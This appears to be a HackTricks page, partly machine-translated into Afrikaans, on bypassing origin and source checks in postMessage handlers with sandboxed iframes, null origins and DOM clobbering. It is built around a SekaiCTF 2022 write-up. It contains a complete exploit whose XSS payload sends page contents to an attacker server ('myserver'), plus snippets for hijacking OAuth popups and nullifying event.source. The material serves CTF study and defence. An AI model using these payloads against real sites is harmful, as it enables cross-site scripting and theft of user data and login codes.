# Bypassing SOP with Iframes - 2

{{#include ../../banners/hacktricks-training.md}}

## Iframes in SOP-2

In die [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_) stel 'n soortgelyke metode voor as in die vorige afdeling. Kom ons kyk dit.

In hierdie challenge moet die aanvaller dit **bypass**:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
As hy dit doen, kan hy 'n **postmessage** stuur met HTML-inhoud wat sonder sanitasie (**XSS**) op die bladsy geskryf sal word met **`innerHTML`**.

Die manier om die **eerste kontrole** te omseil is deur **`window.calc.contentWindow`** op **`undefined`** te stel en **`e.source`** op **`null`**:

- **`window.calc.contentWindow`** is eintlik **`document.getElementById("calc")`**. You can clobber **`document.getElementById`** with **`<img name=getElementById />`** (let wel dat Sanitizer API -[here](https://wicg.github.io/sanitizer-api/index.html#dom-clobbering)- nie gekonfigureer is om teen DOM clobbering-aanvalle in sy standaardtoestand te beskerm nie).
- Daarom kan jy **`document.getElementById("calc")`** clobber met **`<img name=getElementById /><div id=calc></div>`**. Dan sal **`window.calc`** **`undefined`** wees.
- Nou het ons nodig dat **`e.source`** **`undefined`** of **`null`** is (want `==` word gebruik in plaas van `===`, **`null == undefined`** is **`True`**). Om dit te kry is "maklik". As jy 'n **iframe** skep en 'n **postMessage** daarvan stuur en onmiddellik die iframe verwyder, sal **`e.origin`** **`null`** wees. Kyk die volgende kode
```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) //e.origin === null
```
Om die **tweede kontrole** oor die token te omseil, stuur jy **`token`** met die waarde `null` en maak **`window.token`** se waarde **`undefined`**:

- Om `token` in die postMessage met die waarde `null` te stuur is triviaal.
- Die **`window.token`** word verkry deur die funksie **`getCookie`** aan te roep wat **`document.cookie`** gebruik. Let daarop dat enige toegang tot **`document.cookie`** in bladsye met die **`null`** origin 'n **error** veroorsaak. Dit sal daartoe lei dat **`window.token`** die waarde **`undefined`** kry.

Die finale oplossing deur [**@terjanq**](https://twitter.com/terjanq) is die [**volgende**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open(
'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
)

function start() {
var ifr = document.createElement("iframe")
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = "allow-scripts allow-popups"
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr)

function hack() {
var win = open("https://obligatory-calc.ctf.sekai.team")
setTimeout(() => {
parent.postMessage("remove", "*")
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage(
{
token: null,
result:
"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
},
"*"
)
}, 1000)
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = (e) => {
if (e.data == "remove") document.body.innerHTML = ""
}
}
setTimeout(start, 1000)
</script>
</body>
</html>
```
### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)

’n Onlangse TryHackMe-taak (“Vulnerable Codes”) demonstreer hoe OAuth-popups gekaap kan word wanneer die opener binne ’n sandboxed iframe woon wat slegs scripts en popups toelaat. Die iframe dwing beide homself en die popup in ’n `"null"` origin, sodat handlers wat `if (origin !== window.origin) return` nagaan stilweg misluk, omdat `window.origin` binne die popup ook `"null"` is. Alhoewel die blaaier steeds die werklike `location.origin` openbaar, ondersoek die slagoffer dit nooit, dus glip aanvaller-beheerde boodskappe deur.
```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
<script>
const pop = open('https://oauth.example/callback');
pop.postMessage({ cmd: 'getLoginCode' }, '*');
<\/script>`;
document.body.appendChild(frame);
```
Belangrike punte oor die misbruik van daardie opstelling:

- Handlers wat `origin` met `window.origin` binne die popup vergelyk, kan omseil word omdat beide tot `"null"` evalueer, sodat vervalste boodskappe legitim lyk.
- Sandboxed iframes wat `allow-popups` toeken maar `allow-same-origin` weglate, genereer steeds popups wat aan die attacker-controlled null origin gesluit is, wat jou 'n stabiele enklave gee selfs in 2025 Chromium builds.

### Source-nullification & frame-restriction bypasses

Industrie-analises rondom CVE-2024-49038 beklemtoon twee herbruikbare primitives vir hierdie bladsy: (1) jy kan steeds met bladsye kommunikeer wat `X-Frame-Options: DENY` stel deur dit via `window.open` te open en boodskappe te stuur sodra die navigasie afgehandel is, en (2) jy kan brute-force `event.source == victimFrame` kontroles deur die iframe onmiddellik na die stuur van 'n boodskap te verwyder, sodat die ontvanger in die handler net `null` sien.
```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
const victim = open('https://target-app/');
setTimeout(() => {
probe.contentWindow.postMessage(payload, '*');
probe.remove();
}, 500);
};
document.body.appendChild(probe);
```
Kombineer dit met die DOM-clobbering-truuk hierbo: sodra die ontvanger slegs `event.source === null` sien, verval enige vergelyking met `window.calc.contentWindow` of soortgelyks, wat jou in staat stel om weer kwaadwillige HTML sinks deur `innerHTML` te stuur.

## Verwysings
- [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong)
- [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)

{{#include ../../banners/hacktricks-training.md}}
